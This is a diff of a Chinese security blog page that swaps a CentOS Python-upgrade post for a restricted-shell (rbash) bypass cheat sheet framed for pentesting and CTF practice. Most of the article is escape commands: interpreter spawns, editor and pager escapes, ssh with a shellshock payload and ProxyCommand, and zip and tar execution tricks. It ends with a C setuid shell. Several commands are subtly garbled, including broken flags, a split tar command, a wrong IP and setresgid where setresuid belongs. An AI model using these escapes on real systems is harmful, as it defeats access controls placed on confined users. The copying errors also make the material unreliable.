@@ -16,28 +16,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" content="#f8f8f8">
   
-  <title>Linux-Centos升级Python3.x版本踩过的坑 - SafeKiller Zone</title>
+  <title>后渗透-Restricted Shell Bypass - SafeKiller Zone</title>
 
   
-    <meta name="description" content="总字符数: 0.38K                代码: 0.14K, 文本: 0.08K               预计阅读时间: 1 分钟            我把 CentOS7.6 默认自带的 Python 2.7.5 升级成了 Python 3.7.0,而有些文件包括 &#x2F;usr&#x2F;bin&#x2F;firewall-cmd 脚本需要由 python2 来执行. 问题分析出来了,那就">
+    <meta name="description" content="简介 受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止&#x2F;限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有斜杠或输出重定向符号(如&gt;、&gt;&gt;）的命令。常见的受限制的Shell类型有rbash、rksh和rsh。  但是，为什么有人会创建一个受限制的Shel">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux-Centos升级Python3.x版本踩过的坑">
-<meta property="og:url" content="https://jiangjiyue.github.io/2022/06/16/9c8b50f0/index.html">
+<meta property="og:title" content="后渗透-Restricted Shell Bypass">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/07/28/ecc74cbe/index.html">
 <meta property="og:site_name" content="SafeKiller Zone">
-<meta property="og:description" content="总字符数: 0.38K                代码: 0.14K, 文本: 0.08K               预计阅读时间: 1 分钟            我把 CentOS7.6 默认自带的 Python 2.7.5 升级成了 Python 3.7.0,而有些文件包括 &#x2F;usr&#x2F;bin&#x2F;firewall-cmd 脚本需要由 python2 来执行. 问题分析出来了,那就">
+<meta property="og:description" content="简介 受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止&#x2F;限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有斜杠或输出重定向符号(如&gt;、&gt;&gt;）的命令。常见的受限制的Shell类型有rbash、rksh和rsh。  但是，为什么有人会创建一个受限制的Shel">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/d2b5ca33bd97.png">
-<meta property="article:published_time" content="2022-06-16T01:14:21.000Z">
-<meta property="article:modified_time" content="2024-02-10T13:09:54.000Z">
+<meta property="article:published_time" content="2024-07-28T01:04:30.000Z">
+<meta property="article:modified_time" content="2024-07-28T01:45:08.000Z">
 <meta property="article:author" content="Kill3r">
-<meta property="article:tag" content="Centos">
-<meta property="article:tag" content="运维">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="攻防演练">
+<meta property="article:tag" content="靶机练习">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/d2b5ca33bd97.png">
   
   
   
-  <meta name="keywords" content="Centos,运维">
+  <meta name="keywords" content="渗透测试,漏洞利用,攻防演练,靶机练习">
 
   <!-- feed -->
   
@@ -82,35 +82,194 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/">安全运维</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/Linux/">Linux</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2022-06-16T01:14:21.000Z">2022-06-16</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-10T13:09:54.000Z">2024-02-10</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-28T01:04:30.000Z">2024-07-28</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-28T01:45:08.000Z">2024-07-28</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>Linux-Centos升级Python3.x版本踩过的坑</span></h1>
+        <h1 class="text title"><span>后渗透-Restricted Shell Bypass</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
-    <p>总字符数: 0.38K </p>
-    </div>
-    <div class="cell" style="">
-    <p>代码: 0.14K, 文本: 0.08K</p>
-    </div>
-    <div class="cell" style="">
-    <p>预计阅读时间: 1 分钟</p>
-    </div>
-    </div>
+  </div><article class="md-text content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止&#x2F;限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有斜杠或输出重定向符号(如&gt;、&gt;&gt;）的命令。常见的受限制的Shell类型有rbash、rksh和rsh。</p>
+</blockquote>
+<p>但是，为什么有人会创建一个受限制的Shell呢？</p>
+<ol>
+<li>提高安全性</li>
+<li>阻止黑客&#x2F;渗透测试人员</li>
+<li>有时系统管理员会创建一个受限制的Shell来保护自己免受危险命令的影响</li>
+<li>用于CTF挑战(Root-me&#x2F;hackthebox&#x2F;vulnhub）</li>
+</ol>
+<h2 id="枚举Linux环境"><a href="#枚举Linux环境" class="headerlink" title="枚举Linux环境"></a>枚举Linux环境</h2><p> 枚举是最重要的部分。我们需要枚举Linux环境，以确定如何绕过rbash。我们需要进行以下枚举：</p>
+<ol>
+<li><p>检查可用的命令：执行cd、ls、echo等常见命令，确认它们是否可用。在受限制的Shell中，可能会有一些命令被限制或禁用。</p>
+<ul>
+<li>检查cd命令：<code>cd ~</code>，将当前目录切换到用户的主目录。</li>
+<li>检查ls命令：<code>ls</code>，列出当前目录中的文件和文件夹。</li>
+<li>检查echo命令：<code>echo &quot;Hello, World!&quot;</code>，输出字符串”Hello, World!”。</li>
+</ul>
+</li>
+<li><p>检查操作符：了解可用的操作符，如&gt;、&gt;&gt;、&lt;、|等。某些受限制的Shell可能会限制或禁用特定的操作符。</p>
+<ul>
+<li>检查&gt;操作符：<code>echo &quot;Text&quot; &gt; file.txt</code>，将字符串”Text”写入到file.txt文件中。</li>
+<li>检查&gt;&gt;操作符：<code>echo &quot;More text&quot; &gt;&gt; file.txt</code>，将字符串”More text”追加写入到file.txt文件中。</li>
+<li>检查&lt;操作符：<code>cat &lt; file.txt</code>，从file.txt文件中读取内容并输出。</li>
+<li>检查|操作符：<code>ls | grep &quot;txt&quot;</code>，将ls命令的输出通过管道传递给grep命令，过滤包含”txt”的行。</li>
+</ul>
+</li>
+<li><p>检查可用的编程语言：探索可用的编程语言，如perl、ruby、python等。这些语言常常提供了强大的功能，可以用于绕过受限制的Shell。</p>
+<ul>
+<li>检查Perl语言：<code>perl -e &#39;print &quot;Hello, Perl!\n&quot;&#39;</code>，执行Perl代码并输出字符串”Hello, Perl!”。</li>
+<li>检查Ruby语言：<code>ruby -e &#39;puts &quot;Hello, Ruby!&quot;&#39;</code>，执行Ruby代码并输出字符串”Hello, Ruby!”。</li>
+<li>检查Python语言：<code>python -c &#39;print(&quot;Hello, Python!&quot;)&#39;</code>，执行Python代码并输出字符串”Hello, Python!”。</li>
+</ul>
+</li>
+<li><p>查看sudo权限：使用sudo -l命令检查当前用户是否具有以root身份运行某些命令的权限。这可能提供了以root权限执行某些命令的机会。</p>
+<ul>
+<li>检查当前用户的sudo权限：<code>sudo -l</code>，显示当前用户可以以root身份运行的命令列表。</li>
+</ul>
+</li>
+<li><p>检查SUID权限的文件或命令：查找具有SUID权限的文件或命令，这些文件可以以文件所有者的权限而不是当前用户的权限来执行。</p>
+<ul>
+<li>检查SUID权限的文件：<code>find / -perm /4000</code>，查找系统中具有SUID权限的文件，并列出它们的路径。</li>
+</ul>
+</li>
+<li><p>检查当前所使用的Shell：执行echo $SHELL命令，确认当前所使用的Shell是否为受限制的Shell，如rbash。这将有助于了解当前的环境限制。</p>
+<ul>
+<li>检查当前Shell：<code>echo $0</code>，显示当前使用的Shell。</li>
+<li>检查当前Shell：<code>echo $SHELL</code>，显示当前使用的Shell。</li>
+</ul>
+</li>
+<li><p>检查环境变量：运行env或printenv命令，查看当前的环境变量设置。这可以提供关于系统配置和可能的漏洞的信息。</p>
+<ul>
+<li>查看所有环境变量：<code>env</code>或<code>printenv</code>，显示当前的环境变量设置。</li>
+</ul>
+</li>
+</ol>
+<h2 id="常见的攻击技术"><a href="#常见的攻击技术" class="headerlink" title="常见的攻击技术"></a>常见的攻击技术</h2><p>现在让我们看一些常见的攻击技术。</p>
+<ol>
+<li><p><code>echo os.system(&#39;/bin/bash&#39;)</code></p>
+</li>
+<li><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>
+</li>
+<li><p><code>/bin/sh -i</code></p>
+</li>
+<li><p><code>perl —e &#39;exec &quot;/bin/sh&quot;;&#39;</code></p>
+</li>
+<li><p><code>perl: exec &quot;/bin/sh&quot;;</code></p>
+</li>
+<li><p><code>ruby: exec &quot;/bin/sh&quot;</code></p>
+</li>
+<li><p><code>lua: os.execute(&#39;/bin/sh&#39;)</code></p>
+</li>
+<li><p>IRB:<code>exec &quot;/bin/sh&quot;</code></p>
+</li>
+<li><p>vi:</p>
+<ol>
+<li><code>:!bash</code></li>
+<li><code>:set shell =/bin/bash:shell</code></li>
+</ol>
+</li>
+<li><p><code>awk &#39;BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;&#39;</code></p>
+</li>
+<li><p><code>find / -name test -exec /bin/sh or /bin/bash \;</code></p>
+</li>
+<li><p>ssh:<br><code>ssh username@IP – t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;</code><br><code>ssh username@IP -t &quot;bash –noprofile&quot;</code><br><code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (shellshock)</code><br><code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)</code></p>
+</li>
+<li><p>如果允许使用”&#x2F;“，可以运行<code>/bin/sh</code>或<code>/bin/bash</code>。</p>
+</li>
+<li><p>如果可以运行cp命令，可以将<code>/bin/sh</code>或<code>/bin/bash</code>复制到您的目录中。</p>
+</li>
+<li><p>从ftp &gt; <code>!/bin/sh or !/bin/bash </code></p>
+</li>
+<li><p>从gdb &gt; <code>!/bin/sh or !/bin/bash </code></p>
+</li>
+<li><p>从more&#x2F;man&#x2F;less &gt; <code>!/bin/sh or !/bin/bash </code></p>
+</li>
+<li><p>从vim &gt; <code>!/bin/sh or !/bin/bash </code></p>
+</li>
+<li><p>从rvim &gt; <code>python import os; os.system(&quot;/bin/bash&quot;) </code></p>
+</li>
+<li><p>从scp &gt; <code>scp -S /path/yourscript x y:</code></p>
+</li>
+<li><p>从awk &gt; <code>awk &#39;BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;&#39;</code></p>
+</li>
+<li><p>从find &gt; <code>find / -name test -exec /bin/sh or /bin/bash ;</code></p>
+</li>
+<li><p>git帮助状态下通过<code>!/bin/bash</code>进入交互式shell</p>
+</li>
+<li><p><code>pico -s &quot;/bin/bash&quot;</code>进入编辑器写入<code>/bin/bash</code>然后按ctrl + T键</p>
+</li>
+<li><p><code>zip /tmp/test.zip /tmp/test -T –unzip-command=&quot;sh -c /bin/bash&quot;</code></p>
+</li>
+<li><p><code>tar cf /dev/null testfile –checkpoint=1 –</code></p>
+</li>
+<li><p><code>checkpointaction=exec=/bin/bash</code></p>
+</li>
+</ol>
+<h2 id="编程语言技术"><a href="#编程语言技术" class="headerlink" title="编程语言技术"></a>编程语言技术</h2><p> 现在，让我们看一些编程语言技术。 </p>
+<ol>
+<li>从expect &gt; <code>except spawn sh then sh</code>。 </li>
+<li>从python &gt; <code>python -c &#39;import os; os.system(&quot;/bin/sh&quot;)&#39; </code></li>
+<li>从php &gt; <code>php -a then exec(&quot;sh -i&quot;); </code></li>
+<li>从perl &gt; <code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39; </code></li>
+<li>从lua &gt; <code>os.execute(&#39;/bin/sh&#39;)</code> </li>
+<li>从ruby &gt; <code>exec &quot;/bin/sh&quot; </code></li>
+</ol>
+<h2 id="高级技术"><a href="#高级技术" class="headerlink" title="高级技术"></a>高级技术</h2><p>现在让我们进入一些比较高级且不那么正当的技术。 </p>
+<ol>
+<li><p>从ssh &gt; <code>ssh username@IP -t &quot;/bin/sh&quot;或&quot;/bin/bash&quot; </code></p>
+</li>
+<li><p>从ssh2 &gt; <code>ssh username@IP -t &quot;bash --noprofile&quot; 3）</code></p>
+</li>
+<li><p>从ssh3 &gt; <code>ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;(shellshock)</code></p>
+</li>
+<li><p>从ssh4 &gt; <code>ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 27.0.0.1(SUID)</code></p>
+</li>
+<li><p>从git &gt; git help status &gt; 然后可以执行<code>! /bin/bash</code></p>
+</li>
+<li><p>从pico &gt; <code>pico -s &quot;/bin/bash&quot;</code>，然后您可以写入<code>/bin/bash</code>，然后按下<code>CTRL + T</code></p>
+</li>
+<li><p>从zip &gt; <code>zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot; </code></p>
+</li>
+<li><p>从tar &gt; <code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code> </p>
+</li>
+<li><p>C SETUID SHELL:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">// 包含标准库头文件，提供通用工具函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">// 包含POSIX操作系统API的头文件，例如提权函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>    <span class="comment">// 包含输入输出函数的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());   <span class="comment">// 设置真实组ID、有效组ID和保存组ID都为当前进程的组ID</span></span><br><span class="line">    setresgid(geteuid(), geteuid(), geteuid());   <span class="comment">// 设置真实用户ID、有效用户ID和保存用户ID都为当前进程的用户ID</span></span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);   <span class="comment">// 使用execve函数执行/bin/sh，启动一个新的shell进程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// 返回0表示程序执行成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
 
-<p>我把 <code>CentOS7.6</code> 默认自带的 <code>Python 2.7.5</code> 升级成了 <code>Python 3.7.0</code>,而有些文件包括 <code>/usr/bin/firewall-cmd</code> 脚本需要由 <code>python2</code> 来执行.</p>
-<p>问题分析出来了,那就开始解决</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/yum</span><br><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line">vim /usr/bin/yum-config-manager</span><br><span class="line">将第一行注释中的python2修改成环境变量中对应的文件名,我的有效环境变量是python2.6.1</span><br></pre></td></tr></table></figure>
-
-<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/d2b5ca33bd97.png" data-fancybox="true"/></div></div>
 <div class="article-footer fs14">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E8%84%9A%E6%9C%AC/Bash-Restricted-shells">受限Shell挑战</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">linux-restricted-shell-bypass-guide</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.lshack.cn/653/">Shell-逃逸Linux各种Shell来执行命令</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/">Multiple Methods to Bypass Restricted Shell</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
     <section id="license">
       <div class="header"><span>许可协议</span></div>
       <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
@@ -120,36 +279,26 @@
     <section id="share">
       <div class="header"><span>分享文章</span></div>
       <div class="body">
-        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2022/06/16/9c8b50f0/" /></div>
-        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2022/06/16/9c8b50f0/&title=Linux-Centos升级Python3.x版本踩过的坑 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401271038673.png&summary=
-    总字符数: 0.38K 
-    
-    
-    代码: 0.14K, 文本: 0.08K
-    
-    
-    预计阅读时间: 1 分钟
-    
-    
-
-我把 CentOS7.6 默认自带的 Python ..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=Linux-Centos升级Python3.x版本踩过的坑 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2022/06/16/9c8b50f0/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/07/28/ecc74cbe/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/07/28/ecc74cbe/&title=后渗透-Restricted Shell Bypass - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407280911538.png&summary=简介
+受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止&#x2F;限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=后渗透-Restricted Shell Bypass - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/07/28/ecc74cbe/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
         
         <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
-          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2022/06/16/9c8b50f0/"/>
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/07/28/ecc74cbe/"/>
         </div>
         
       </div>
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2022/06/23/92579896/">PHP-JSON 字符串转义问题</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2022/03/10/8c8446e0/">VulnHub-脏牛提权复现</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/17/b05c14ed/">应急响应靶机训练-Linux2</a></div></section></div>
 
 <div class="related-wrap" id="related-posts">
     <section class='header'>
       <div class='title cap theme'>您可能感兴趣的文章</div>
     </section>
     <section class='body'>
-    <div class="related-posts"><a class="item" href="\2021\09\01\46f9142e\" title="Linux-FireWalld"><span class="title">Linux-FireWalld</span></a><a class="item" href="\2024\01\31\375e6e18\" title="Linux-MySQL从入门到精通(下)"><span class="title">Linux-MySQL从入门到精通(下)</span></a><a class="item" href="\2024\01\29\2e455f59\" title="Linux-MySQL从入门到精通(上)"><span class="title">Linux-MySQL从入门到精通(上)</span></a><a class="item" href="\2021\09\24\bee72ce8\" title="Linux-MySQL开启慢查询日志"><span class="title">Linux-MySQL开启慢查询日志</span></a><a class="item" href="\2024\02\18\693474ed\" title="Linux-Shell编程从0到1"><span class="title">Linux-Shell编程从0到1</span></a></div></section></div>
+    <div class="related-posts"><a class="item" href="\2024\02\24\e36a7018\" title="VulnHub-Kioptrix Level 1 古老的 Apache Vuln"><span class="title">VulnHub-Kioptrix Level 1 古老的 Apache Vuln</span></a><a class="item" href="\2022\11\02\735afd67\" title="VulnHub-DC系列"><span class="title">VulnHub-DC系列</span></a><a class="item" href="\2024\02\26\7e189a50\" title="VulnHub-Kioptrix Level 2 简单的命令注入 + 内核提权"><span class="title">VulnHub-Kioptrix Level 2 简单的命令注入 + 内核提权</span></a><a class="item" href="\2024\02\28\aba73427\" title="VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权"><span class="title">VulnHub-Kioptrix Level 3 SQL 注入 + sudo 提权</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
 
 
   <div class="related-wrap md-text" id="comments">
@@ -184,7 +333,14 @@
 </div>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel blur'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BELinux%E7%8E%AF%E5%A2%83"><span class="toc-text">枚举Linux环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-text">常见的攻击技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF"><span class="toc-text">编程语言技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF"><span class="toc-text">高级技术</span></a></li></ol></div><div 